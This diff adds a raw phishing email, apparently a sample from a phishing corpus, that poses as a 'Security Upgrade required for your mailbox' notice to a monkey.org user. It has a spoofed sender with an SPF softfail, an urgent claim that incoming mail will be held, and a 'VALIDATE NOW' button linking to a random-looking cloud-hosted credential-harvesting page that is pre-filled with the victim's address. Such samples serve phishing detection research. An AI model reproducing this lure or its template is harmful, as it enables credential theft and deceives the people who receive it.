@@ -1,0 +1,175 @@
+From:(d..hardeman@enron.com), <test@attack.com>
+To: email793@speedy.uwaterloo.ca
+Subject: jose@monkey.org  Security Upgrade required for your mailbox
+Date: 05 Jul 2021 06:10:28 +0300
+Message-ID: <20210705061028.995F06A724BA1C8F@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=3.83
+Authentication-Results: imf01.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf01.b.hostedemail.com: 89.115.244.164 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+X-Stat-Signature: 4chtop7x3os3wzgztcxzjf19p3fsiefd
+X-Rspamd-Queue-Id: EA1CA18402A7B
+X-Rspamd-Server: rspam01
+X-HE-Tag: 1625454710-669489
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 51
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"center" bgcolor=3D"#f5f7f8=
+" border=3D"0">
+<TBODY>
+<TR>
+<td valign=3D"top" width=3D"600" align=3D"center">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 600px;=
+ BORDER-TOP: rgb(240,241,246) 1px solid; FONT-FAMILY: -apple-system, BlinkM=
+acSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, Arial, sans=
+-serif; BORDER-RIGHT: rgb(240,241,246) 1px solid; BORDER-COLLAPSE: collapse=
+; BORDER-BOTTOM: rgb(240,241,246) 1px solid; FONT-WEIGHT: normal; BORDER-LE=
+FT: rgb(240,241,246) 1px solid; LINE-HEIGHT: normal; font-feature-settings:=
+ &quot;liga&quot; 0" cellspacing=3D"0" cellpadding=3D"0" align=3D"center" b=
+order=3D"0">
+<TBODY>
+<TR>
+<td style=3D"MAX-WIDTH: 600px" bgcolor=3D"#ffffff" valign=3D"top" width=3D"=
+600" align=3D"center">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td valign=3D"top" align=3D"center">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"92%" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td valign=3D"top" align=3D"center">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" align=3D"center">
+<TBODY>
+<TR>
+<td valign=3D"top"><BR class=3DApple-interchange-newline>
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"90%">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto, Arial; FONT-WEIGHT: 600;=
+ COLOR: rgb(51,51,51); LINE-HEIGHT: 18px" valign=3D"top">Dear&nbsp;jose ,</=
+TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<td valign=3D"top">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR>
+<td height=3D"25"><BR></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Arial; COLOR: rgb(102,10=
+2,102); LINE-HEIGHT: 19px">We have a new version for your mailbox. You need=
+ to validate your account in order to switch to the new version.<BR><BR>Inc=
+oming messages will be placed on hold if your do not validate your&nbsp;mai=
+lbox immediately.</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<td height=3D"20" valign=3D"top" align=3D"left"><BR></TD></TR></TBODY></TAB=
+LE></TD></TR>
+<TR>
+<td valign=3D"top" align=3D"center"><BR><BR>
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" align=3D"center" border=3D"0">
+<TBODY>
+<TR>
+<td bgcolor=3D"#00a63f" height=3D"40" width=3D"288" align=3D"center"><A sty=
+le=3D"FONT-SIZE: 14px; TEXT-DECORATION: none; FONT-FAMILY: Roboto, Arial; T=
+EXT-TRANSFORM: uppercase; FONT-WEIGHT: 500; COLOR: rgb(255,255,255); DISPLA=
+Y: block; LINE-HEIGHT: 40px" href=3D"https://roundsk333qwertyuioplkjhfgdsaz=
+xcvbnmlswdfghejkliamnbdsgwhyli.eu-gb.cf.appdomain.cloud/?email=3Djose@monke=
+y.org" rel=3Dnoopener target=3D_blank><SPAN style=3D"FONT-SIZE: small"><FON=
+T size=3D3>VALIDATE</FONT></SPAN><SPAN>&nbsp;</SPAN>NOW</A></TD></TR></TBOD=
+Y>
+</TABLE></TD></TR>
+<TR>
+<td valign=3D"top">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+<TBODY>
+<TR>
+<td height=3D"25"><BR></TD></TR>
+<TR>
+<td style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Arial; COLOR: rgb(102,10=
+2,102); LINE-HEIGHT: 19px"><STRONG>NOTE:</STRONG>&nbsp;Admin will always ke=
+ep you notified on recent webmail update for better optimized usage.</TD></=
+TR></TBODY></TABLE></TD></TR>
+<TR>
+<td style=3D"BORDER-BOTTOM: rgb(238,238,238) 1px solid" height=3D"25"><BR><=
+/TD></TR>
+<TR>
+<td height=3D"23"><BR></TD></TR>
+<TR>
+<td valign=3D"top">
+<table class=3D"mce-item-table" style=3D"FONT-SIZE: 13px; FONT-FAMILY: -app=
+le-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;Segoe UI&q=
+uot;, Arial, sans-serif; BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; LI=
+NE-HEIGHT: normal; font-feature-settings: &quot;liga&quot; 0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"90%">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto, Arial; FONT-WEIGHT: 600;=
+ COLOR: rgb(51,51,51); LINE-HEIGHT: 18px" valign=3D"top">&copy;2021&nbsp;mo=
+nkey.org Administrator Service. All Rights Reserved</TD></TR></TBODY></TABL=
+E></TD></TR>
+<TR>
+<td height=3D"32"><BR style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial; WHITE-S=
+PACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; CO=
+LOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=
+ normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant=
+-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial; text-decoration-style: initial; tex=
+t-decoration-color: initial"></TD></TR></TBODY></TABLE>
+</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TAB=
+LE></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; MARGIN: 0px 0px 1em'>
+<BR style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFon=
+t, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WO=
+RD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(85,85,8=
+5); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT=
+-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -w=
+ebkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-deco=
+ration-style: initial; text-decoration-color:=20
+initial'></P></BODY></HTML>
